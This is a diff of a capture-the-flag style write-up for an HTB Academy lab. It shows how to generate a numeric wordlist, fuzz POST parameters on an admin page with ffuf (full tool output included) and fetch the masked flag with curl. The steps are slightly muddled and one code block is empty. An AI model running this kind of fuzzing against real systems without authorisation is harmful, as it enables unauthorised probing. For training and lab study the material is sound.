@@ -83,8 +83,65 @@ Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing
 
 ##### Custom Wordlist
 
+First we create our own wordlist which is a basic for loop from 0 to 1000 as followws:
 ```for i in $(seq 1 1000); do echo $i >> ids.txt; done ```
 
-##### Value Fuzzing
+We confirm we have the file generated:
 
-```ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d ‘id=FUZZ’ -H ‘Content-Type: application/x-www-form-urlencoded’ -fs 900```
+```
+
+```
+
+##### Value Fuzzing
+* 1st we get teh fs value for the id
+```
+root@cloud1:/opt/repos/SecLists/Discovery/Web-Content# ffuf -w burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:35826/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'|head
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://admin.academy.htb:35826/admin/admin.php
+ :: Wordlist         : FUZZ: /opt/repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : FUZZ=key
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+11                      [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 17ms]
+1                       [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 17ms]
+A                       [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 18ms]
+4                       [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 18ms]
+21                      [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 17ms]
+AMOUNT                  [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 17ms]
+2                       [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 18ms]
+Address                 [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 18ms]
+22                      [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 19ms]
+ACCESSLEVEL             [Status: 200, Size: 798, Words: 227, Lines: 54, Duration: 19ms]
+:: Progress: [48/6453] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 
+```
+
+* 2nd We use the Obtained ID from our for loop to try the one that works as follows:
+```
+root@cloud1:/opt/repos/SecLists/Discovery/Web-Content# curl http://admin.academy.htb:35826/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
+<div class='center'><p>HTB{pXXXXXXXXXXXXXXXXXXXXXX}</p></div>
+<html>
+<!DOCTYPE html>
+
+<head>
+  <title>HTB Academy</title>
+  <style>
+
+```
+And we capture the FLAG ^_^
